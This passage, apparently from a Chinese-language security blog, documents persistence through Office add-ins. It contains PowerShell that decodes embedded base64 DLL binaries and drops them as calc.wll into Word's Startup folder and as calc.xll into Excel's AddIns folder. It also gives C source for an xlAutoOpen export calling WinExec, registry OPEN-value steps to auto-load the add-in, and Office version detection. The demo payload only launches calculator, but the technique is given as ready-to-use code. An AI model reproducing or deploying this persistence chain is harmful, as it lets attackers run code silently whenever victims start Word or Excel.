AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAACjAQMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></p>

<p>用变量$fileContent存储base64加密的calc.dll</p>

<p>base64解密并释放calc.wll至Startup路径的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAC1TSnZ8SxHivEsR4rxLEeKGTNNivUsR4oZM0OK8yxHivEsRor2LEeKkzNUivIsR4oZM0yK8yxHilJpY2jxLEeKAAAAAAAAAABQRQAATAEEAH4YaFkAAAAAAAAAAOAADiELAQYAAAIAAAAGAAAAAAAAyxAAAAAQAAAAIAAAAAAAEAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAABQAAAABAAAAAAAAAIAAAAAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAABwgAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAADQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAbgEAAAAQAAAAAgAAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAAMYAAAAAIAAAAAIAAAAGAAAAAAAAAAAAAAAAAABAAABALmRhdGEAAAAwAAAAADAAAAACAAAACAAAAAAAAAAAAAAAAAAAQAAAwC5yZWxvYwAAWgAAAABAAAAAAgAAAAoAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAItEJAhIdQ1qAWgQMAAQ/xUAIAAQuAEAAADCDACQkJCQi0QkCIXAdQ45BRwwABB+Lv8NHDAAEIsNFCAAEIP4AYsJiQ0gMAAQdT9ogAAAAP8VECAAEIXAWaMoMAAQdQQzwOtmgyAAoSgwABBoBDAAEGgAMAAQoyQwABDo6gAAAP8FHDAAEFlZ6z2FwHU5oSgwABCFwHQwiw0kMAAQVo1x/DvwchKLDoXJdAf/0aEoMAAQg+4E6+pQ/xUIIAAQgyUoMAAQAFleagFYwgwAVYvsU4tdCFaLdQxXi30QhfZ1CYM9HDAAEADrJoP+AXQFg/4CdSKhLDAAEIXAdAlXVlP/0IXAdAxXVlPoFf///4XAdQQzwOtOV1ZT6OX+//+D/gGJRQx1DIXAdTdXUFPo8f7//4X2dAWD/gN1JldWU+jg/v//hcB1AyFFDIN9DAB0EaEsMAAQhcB0CFdWU//QiUUMi0UMX15bXcIMAP8lDCAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdCAAAAAAAACMIAAAlCAAAKAgAACqIAAAAAAAAFggAAAAAAAAAAAAAH4gAAAAIAAAYCAAAAAAAAAAAAAAuiAAAAggAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHQgAAAAAAAAjCAAAJQgAACgIAAAqiAAAAAAAADTAldpbkV4ZWMAS0VSTkVMMzIuZGxsAABeAmZyZWUAAA8BX2luaXR0ZXJtAJECbWFsbG9jAACdAF9hZGp1c3RfZmRpdgAATVNWQ1JULmRsbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAACjAQMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
[System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\Word\Startup\calc.wll",$fileContentBytes)
</code></pre></div></div>

<p>以上代码运行后，在<code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming\Microsoft\Word\Startup\</code>生成calc.wll，启动word.exe时,弹出计算器</p>

<h2 id="0x03-excel-xll">0x03 Excel XLL</h2>
<hr>

<h3 id="1手动测试-1">1、手动测试</h3>

<p>新建dll工程，添加导出函数xlAutoOpen，具体代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void xlAutoOpen()
{
    WinExec("calc.exe",SW_SHOWNORMAL);
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }
    return TRUE;
}
</code></pre></div></div>

<p>添加文件，设置类型：Text File</p>

<p>名称：工程同名文件.def</p>

<p>写入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXPORTS
xlAutoOpen
</code></pre></div></div>

<p>编译成calc2.dll，导出函数为xlAutoOpen()，优化后大小为3kb</p>

<p>重命名为calc.xll，保存路径如下：</p>

<p><code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\AddIns</code></p>

<p>查找注册表键值：</p>

<p>Office2010对应的键值为：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options</code></p>

<p>Office2013对应的键值为：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Excel\Options</code></p>

<p>新建<code class="language-plaintext highlighter-rouge">字符串</code>值： <code class="language-plaintext highlighter-rouge">OPEN</code>： <code class="language-plaintext highlighter-rouge">/R calc.xll</code></p>

<p>启动Excel.exe，弹出计算器，并且Excel正常启动</p>

<h3 id="2编写powershell脚本实现-1">2、编写Powershell脚本实现</h3>

<p>同上，calc2.dll作base64加密并存储于变量中：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = [System.IO.File]::ReadAllBytes('calc.xll')
$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("calcxllbase64.txt") 
</code></pre></div></div>

<p>得到</p>

<p><code class="language-plaintext highlighter-rouge">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ZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></p>

<p>用变量$fileContent存储base64加密的calc.xll</p>

<p>根据.xll文件的释放路径，base64解密并生成calc.xll的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = "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ZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
[System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\AddIns\calc.xll",$fileContentBytes)
</code></pre></div></div>

<p>通过powershell判断office版本：</p>

<p><code class="language-plaintext highlighter-rouge">dir -name "C:\Program Files\Microsoft Office\Office*"</code></p>

<p>回显： <code class="language-plaintext highlighter-rouge">Office14</code></p>

<p>对字符串截取，截取出版本号14，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$OfficeVersion=dir -name "C:\Program Files\Microsoft Office\Office*"

$Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 ) 
</code></pre></div></div>

<p>加入异常捕获，如果系统未安装Office，返回提示信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Try  
{  
    $OfficeVersion=dir -name "C:\Program Files\Microsoft Office\Office*" -ErrorAction Stop  
    $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 ) 
}  
Catch  
{  
    Write-Host "[!] I can't find Microsoft Office!" 
    Write-Host "[+] Please reinput a correct path."  
}  
 
Write-Host "Microsoft Office Version:" $Ver
</code></pre></div></div>

<p>拼接不同Office版本对应的注册表路径:</p>

